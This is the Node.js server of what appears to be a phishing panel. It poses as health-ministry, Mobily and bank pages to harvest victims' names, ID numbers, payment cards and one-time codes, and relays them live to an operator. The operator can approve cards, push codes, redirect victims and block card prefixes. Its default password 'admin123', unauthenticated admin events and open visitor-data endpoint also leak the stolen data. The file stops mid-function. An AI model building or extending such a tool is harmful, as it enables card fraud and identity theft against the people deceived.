const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();

// Security: permanently disable proxy and all captured-data ingestion.
app.use((req, res, next) => {
  if (["/api/proxy", "/api/moh-data", "/api/captured-data"].includes(req.path)) {
    return res.status(410).json({ error: "proxy and data capture disabled" });
  }
  next();
});
const server = http.createServer(app);

// CORS Configuration - Allow all origins dynamically
const corsOptions = {
  origin: function(origin, callback) {
    // Reflect the requesting origin back (allows credentials to work)
    // If no origin (server-to-server, curl, etc), allow
    callback(null, origin || true);
  },
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());
app.use('/admin', express.static('admin'));

// Socket.IO Configuration - Dynamic origin for proper cross-site disconnect detection
const io = new Server(server, {
  cors: {
    origin: function(origin, callback) {
      // Reflect the requesting origin back (required for credentials + CORS)
      callback(null, origin || true);
    },
    methods: ["GET", "POST"],
    credentials: true,
  },
  allowEIO3: true,
  transports: ["websocket", "polling"],
  pingTimeout: 10000,
  pingInterval: 5000,
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup
function saveData() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the last IP from x-forwarded-for (the external/public IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1]; // Use the last IP (external)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}


// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
  
    const visitorInfo = getVisitorInfo(socket);
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    const siteName = data?.siteName || "غير معروف";
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        siteName: siteName || existingVisitor.siteName || "غير معروف",
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        siteName: siteName,
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
      });
    }
  });

  // Handle visitor name update (from MOH username)
  socket.on("visitor:updateName", (name) => {
    const visitor = visitors.get(socket.id);
    if (visitor && name) {
      visitor.fullName = name;
      visitor.mohUsername = name;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:nameUpdated", {
          visitorId: visitor._id,
          name: name,
        });
      });

      console.log(`Visitor ${visitor._id} name updated to: ${name}`);
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {

    const visitor = visitors.get(socket.id);
    if (visitor) {
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
        // استخراج اسم العميل من البيانات المرسلة وتحديث بطاقة الزائر
        const nameField = data.content["الاسم الكامل"] || data.content["الاسم"] || data.content["fullName"] || data.content["name"] || data.content["firstName"];
        if (nameField && !visitor.fullName) {
          visitor.fullName = nameField;
          visitor.mohUsername = nameField;
          // إعلام الأدمن بتحديث الاسم
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:nameUpdated", {
              visitorId: visitor._id,
              name: nameField,
            });
          });
          console.log(`Visitor ${visitor._id} name auto-extracted: ${nameField}`);
        }
      }
      if (data.paymentCard) {
        const now = new Date().toISOString();
        visitor.paymentCards.push({
          ...data.paymentCard,
          timestamp: now,
        });
        // Start tracking from card page
        visitor.lastDataUpdate = now;
        visitor.hasEnteredCardPage = true;
      }
      if (data.digitCode) {
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Only update if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // === Helper: Send lightweight visitor update to admins ===
  function sendVisitorUpdate(visitor) {
    // Send only the changed visitor instead of all visitors
    const lightUpdate = [{
      _id: visitor._id,
      waitingForAdminResponse: visitor.waitingForAdminResponse,
      page: visitor.page,
      lastSentCode: visitor.lastSentCode,
    }];
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitors:update", lightUpdate);
    });
  }

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    io.to(visitorSocketId).emit("mobily:rejected");
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    io.to(visitorSocketId).emit("visitor:navigate", page);
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      sendVisitorUpdate(visitor);
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Also logout the admin who changed the password
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
// Temporary password reset endpoint
app.get("/api/reset-password", (req, res) => {
  return res.status(410).json({ error: "password reset endpoint disabled" });
});

app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// ===== API: Receive captured data from Cloudflare data-collector Worker =====
// ===== API: Receive data directly from MOH Worker-injected script =====
app.post("/api/moh-data", (req, res) => {
  return res.status(410).json({ error: "data capture disabled" });
  try {
    const { type, data, visitorId, socketId: reqSocketId } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
    const clientIp = ip.split(',')[0].trim();
    
